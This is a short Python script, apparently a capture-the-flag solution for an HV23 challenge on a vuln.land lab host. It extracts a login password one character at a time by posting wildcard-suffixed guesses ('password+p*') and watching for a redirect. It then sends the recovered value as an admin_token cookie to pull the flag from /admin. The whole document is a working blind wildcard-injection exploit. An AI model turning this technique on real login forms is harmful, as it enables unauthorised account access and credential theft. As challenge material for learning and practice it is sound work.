import requests
from string import printable
from time import sleep
import re

url = 'http://xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx.idocker.vuln.land'

password = 'salami'
while True:
    for p in printable[:71]:
        print(f'trying {password+p}*')
        resp = requests.post(url+'/login', data=f'password={password+p}*').text
        while not ('redirecting' in resp or 'Invalid username or password!' in resp):
            print(f'continuing trying {password+p}*')
            resp = requests.post(url+'/login', data=f'password={password+p}*').text
            sleep(0.25)
        if 'redirecting' in resp:
            password += p
            break
    else:
        break

print('\nFlag: '+re.findall(r'(HV23\{\w.*?\})', requests.get(url+'/admin', cookies={'admin_token':password}).text)[0])